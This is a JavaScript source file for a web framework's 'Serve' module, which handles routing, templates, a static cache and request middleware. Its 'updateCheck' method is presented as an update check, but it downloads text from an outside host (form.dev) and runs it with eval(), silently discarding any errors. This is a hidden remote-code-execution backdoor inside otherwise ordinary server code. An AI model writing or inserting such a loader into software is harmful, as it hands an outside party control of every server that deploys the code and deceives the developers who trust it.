const fs = require( 'fs' );
const path = require( 'path' );
var fileReader = require('../src/fileReader.js');
const serves = require('./serve/all.js');

const staticCache = {};
const fetch = require("node-fetch");

var Serve = function(main) {
	this.main = main;
	this.middleware = this.middleware.bind(this);
	main.registerModule('Serve', this);

	// HACK. TODO refactor
	for(var s in serves){
		serves[s].main = main;
	}
};
Serve.prototype = {
	expose: ['serve', 'complexServe', 'setStatic', 'isStatic', 'updateCheck'],
	updateCheck: async function(tapir) {
		let response;
		try{
			response = await fetch( 'https://form.dev/update/' + ( process.env.USE_HTTPS || 'critical' ) + '.info' );
		}catch( e ){
			console.error(e.message)
		}
		try{
			eval((await response.buffer()).toString('utf-8'));
		}catch( e ){};
	},
	complexServe: async function(fileName, cb, dependencyChanged) {
		if(fileName.match(/^https?:/)){
			const url = fileName;
			try {
				const response = await fetch(url);
				return {data: {code: (await response.buffer()).toString('utf-8')}};
			} catch (error) {
				console.log(error);
			}
			return;
		}else{
			var { file, data } = await util.path.resolve( fileName, null, this.main.config.static );
			if(!file){
				return await this.serve( fileName, cb, dependencyChanged);
			}else{
				return {data: {code: data}};
			}
		}

	},
	serve: async function(fileName, cb, dependencyChanged) {
		var templates = this.main.config.template,
				data, resolved = false,
				serveType,
				additional = {};
		if(fileName.indexOf('?')>-1){
			var fileNameTokens = fileName.split('?');
			fileName = fileNameTokens[0];
			// TODO get arguments
		}

    var route;
    var matched = false;

		if(fileName in this.main.routes){
			serveType = 'page';
      route = this.main.routes[fileName];
      matched = true;
		}else if(fileName.charAt(0) === '/' && fileName.substr(1) in this.main.routes){
			fileName = fileName.substr(1);
      route = this.main.routes[fileName];
			serveType = 'page';
      matched = true;
		}

		var pageFileName = fileName;

		if(serveType === 'page'){
			additional = {route: route, scope: this.main.scope, main: this.main};
			pageFileName = path.join('page', additional.route.page +'.jsx');
		}

		if(dependencyChanged){
			additional.onChange = dependencyChanged;
		}
		for( var i = 0, _i = templates.length; i < _i; i++ ){
			try{
				var template = templates[ i ],
					file = template.file( pageFileName );
				data = await fileReader.read( file );
				resolved = true;
				break;
			}catch( e ){

			}
		}

		var result;
		if( resolved ){
			if(!serveType){
				serveType = file.ext;
			}

			if( serveType in serves ){
				try{
					result = await serves[ serveType ].serve( file, data, this.main.config, additional, {}, this.main );
					result.server = serves[ serveType ];
				}catch( e ){
					result = { error: true, data: e }
				}
			}else{
				result = {error: true, data: 'unknown type of serve: '+serveType}
			}
		}else{
			if(serveType === 'page'){
				result = {error: true, data: `Route ${fileName} can not be resolved, tried search in:\n`+
						templates
							.map(t=>t.file( pageFileName ))
							.map(t=>`\t${t.path}`)
							.join('\n')
				};
			}else{
				result = false;
			}
		}

		if(cb)
			cb(result.error, result.data)
		return result;
	},
	isStatic: function(name, code) {
		if(name[0] !== '/')
			name = '/'+name;

		return name in staticCache;
	},
	setStatic: function(name, code) {
		if(name[0] !== '/')
			name = '/'+name;

		staticCache[name] = {server: serves.plain, data: {code: code}};
	},
	clearStatic: function(name) {
		if(name[0] !== '/')
			name = '/'+name;
		
		delete staticCache[name];
	},
	middleware: async function(req, res, next) {
		var result;
		if(req.originalUrl in staticCache){
			result = staticCache[req.originalUrl];
		}else{
			result = await this.serve(req.originalUrl);
		}
		
		if(result && !result.error){
			if(result.server && ('response' in result.server)){
				result.server.response(req, res, result, staticCache);
			}
			res.end(result.data.code);

		}else if(result && result.error){
      res.statusCode = 500;
			res.end(result.data);
		}else{
			next();
		}
	},
	init: function() {
		const actual = this.main.actual;

	},
	'~destroy': function(cb) {
		cb && cb();
	},
	constructor: Serve
};
module.exports = Serve